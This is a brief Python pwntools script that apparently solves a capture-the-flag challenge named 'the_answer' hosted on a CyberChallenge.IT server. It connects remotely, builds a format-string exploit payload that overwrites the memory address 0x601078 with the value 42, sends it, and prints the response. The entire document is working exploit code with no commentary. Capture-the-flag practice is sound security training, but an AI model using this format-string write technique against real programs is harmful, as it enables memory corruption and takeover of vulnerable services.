from pwn import *
p=remote("answer.challs.cyberchallenge.it", 9122)
p.recv()
program=ELF("./file_challenge/the_answer",checksec=False)
context.binary=program
offset=10
answer=0x601078
payload=fmtstr_payload(offset,{answer:42})
print(payload)
p.sendline(payload)
print(p.recvall())
